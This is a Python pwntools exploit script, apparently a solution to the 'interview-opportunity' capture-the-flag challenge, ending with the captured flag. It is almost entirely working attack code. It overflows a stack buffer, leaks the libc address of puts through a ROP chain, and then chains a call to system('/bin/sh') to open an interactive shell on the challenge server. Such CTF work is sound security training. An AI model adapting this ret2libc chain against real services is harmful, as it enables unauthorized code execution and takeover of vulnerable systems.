#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template interview-opportunity_patched
from pwn import *

HOST, PORT = "mc.ax 31081".split()
# Set up pwntools for the correct architecture
exe = context.binary = ELF('interview-opportunity_patched')
libc = ELF("./libc.so.6")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

def prepare_rop(chain: list) -> bytes:
    return b"".join(
        p64(_) for _ in chain
    )

io = start()

pop_rdi = 0x401313 # pop rdi; ret;

io.recvuntil(b"DiceGang?\n")

chain = [
    pop_rdi, exe.got.puts,
    exe.plt.puts,
    exe.sym.main
]

offset = 0x22
payload = b""
payload += cyclic_gen().get(offset)
payload += prepare_rop(chain)
io.sendline(payload)
io.recvline()
io.recvline()
leak = io.recvline().strip().ljust(8, b"\x00")
libc.address = u64(leak) - libc.sym.puts
log.success(f"libc @ {hex(libc.address)}")

io.recvuntil(b"DiceGang?\n")

_rop = lambda _: _+libc.address
pop_rdi = _rop(0x26796) # pop rdi; ret;

chain = [
    pop_rdi, next(libc.search(b"/bin/sh")),
    libc.sym.system
]

payload = b""
payload += cyclic_gen().get(offset)
payload += prepare_rop(chain)
io.sendline(payload)
io.recvline()
io.recvline()

io.interactive()

# dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3}
